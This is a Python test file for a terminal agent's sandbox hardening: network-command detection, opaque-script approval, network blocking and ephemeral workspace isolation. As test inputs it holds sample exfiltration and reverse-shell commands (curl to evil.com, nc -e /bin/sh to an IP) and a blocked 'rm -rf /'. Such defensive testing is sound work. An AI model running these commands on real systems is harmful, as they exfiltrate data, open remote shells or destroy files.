"""Unit tests for hardened sandbox defenses, network isolation, and ephemeral workspaces."""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

from terminal_agent.sandbox.base import (
    SandboxPolicy,
    is_network_command,
)
from terminal_agent.sandbox.docker import DockerSandbox
from terminal_agent.sandbox.local import LocalRestrictedSandbox
from terminal_agent.utils.permissions import (
    SafetyLevel,
    classify_command,
    is_opaque_script_execution,
)


class TestNetworkCommandDetection:
    """Verify detection of network exfiltration tools."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "curl https://evil.com/exfiltrate",
            "wget http://malware.site/payload",
            "nc -e /bin/sh 10.0.0.1 4444",
            "ncat 192.168.1.100 8080",
            "netcat -lvp 9000",
            "ssh user@remote.host",
            "scp data.tar.gz user@backup.srv:",
            "powershell Invoke-WebRequest -Uri http://test.com",
            "Invoke-RestMethod http://api.com",
            "curl.exe -s http://test.org",
        ],
    )
    def test_network_commands_detected(self, cmd: str):
        assert is_network_command(cmd) is True

    @pytest.mark.parametrize(
        "cmd",
        [
            "pytest tests/",
            "python main.py",
            "git status",
            "git log -n 5",
            "ls -la",
            "cat README.md",
            "npm test",
        ],
    )
    def test_non_network_commands_permitted(self, cmd: str):
        assert is_network_command(cmd) is False


class TestOpaqueScriptDetection:
    """Verify detection of third-party shell scripts and installers."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "bash setup.sh",
            "sh install.sh",
            "./setup.sh",
            "./install.sh",
            "bash ./deploy.bash",
            "powershell -File ./configure.ps1",
            "cmd /c setup.bat",
            "run.cmd",
            "python setup.py install",
            "pip install -e .",
        ],
    )
    def test_opaque_scripts_detected(self, cmd: str):
        assert is_opaque_script_execution(cmd) is True

    @pytest.mark.parametrize(
        "cmd",
        [
            "pytest tests/",
            "python -m pytest",
            "python test_calculator.py",
            "git status",
            "git diff HEAD~1",
            "cat setup.py",
            "type install.sh",
        ],
    )
    def test_standard_commands_not_opaque_scripts(self, cmd: str):
        assert is_opaque_script_execution(cmd) is False

    def test_opaque_script_requires_approval_even_if_interpreter_is_safe(self):
        # Even if 'bash' is considered safe, 'bash setup.sh' must require approval
        safe_cmds = ["bash", "sh", "python"]
        blocked = ["rm -rf /"]

        res = classify_command("bash setup.sh", safe_cmds, blocked, "safe")
        assert res == SafetyLevel.NEEDS_APPROVAL

        res2 = classify_command("sh install.sh", safe_cmds, blocked, "safe")
        assert res2 == SafetyLevel.NEEDS_APPROVAL


class TestLocalSandboxHardening:
    """Verify local restricted sandbox network and ephemeral workspace isolation."""

    @pytest.mark.asyncio
    async def test_network_blocked_when_allow_network_false(self, tmp_path: Path):
        policy = SandboxPolicy(working_dir=tmp_path, allow_network=False)
        sandbox = LocalRestrictedSandbox(policy=policy)

        res = await sandbox.execute("curl https://example.com")
        assert res.is_error
        assert "Security violation" in res.stderr
        assert "network access is disabled" in res.stderr

    @pytest.mark.asyncio
    async def test_ephemeral_workspace_protects_host_files(self, tmp_path: Path):
        """Verify that destructive operations in ephemeral mode do not affect host files."""
        # Create a critical file in the host workspace
        critical_file = tmp_path / "critical_data.txt"
        critical_file.write_text("HOST_DATA_DO_NOT_DELETE", encoding="utf-8")

        policy = SandboxPolicy(working_dir=tmp_path, ephemeral=True)
        sandbox = LocalRestrictedSandbox(policy=policy)

        # Execute a command that deletes critical_data.txt inside the sandbox
        delete_cmd = f'"{sys.executable}" -c "import os; os.remove(\'critical_data.txt\') if os.path.exists(\'critical_data.txt\') else None"'
        res = await sandbox.execute(delete_cmd)
        assert not res.is_error

        # CRITICAL ASSERTION: The original file in the host workspace MUST STILL EXIST!
        assert critical_file.exists(), "Security failure: Host file was deleted despite ephemeral mode!"
        assert critical_file.read_text(encoding="utf-8") == "HOST_DATA_DO_NOT_DELETE"


class TestDockerSandboxConfiguration:
    """Verify Docker sandbox passes isolation flags."""

    def test_docker_network_none_flag_when_allow_network_false(self, tmp_path: Path):
        policy = SandboxPolicy(working_dir=tmp_path, allow_network=False)
        sandbox = DockerSandbox(policy=policy)
        assert sandbox.policy.allow_network is False

    def test_docker_ephemeral_flag_set(self, tmp_path: Path):
        policy = SandboxPolicy(working_dir=tmp_path, ephemeral=True)
        sandbox = DockerSandbox(policy=policy)
        assert sandbox.policy.ephemeral is True
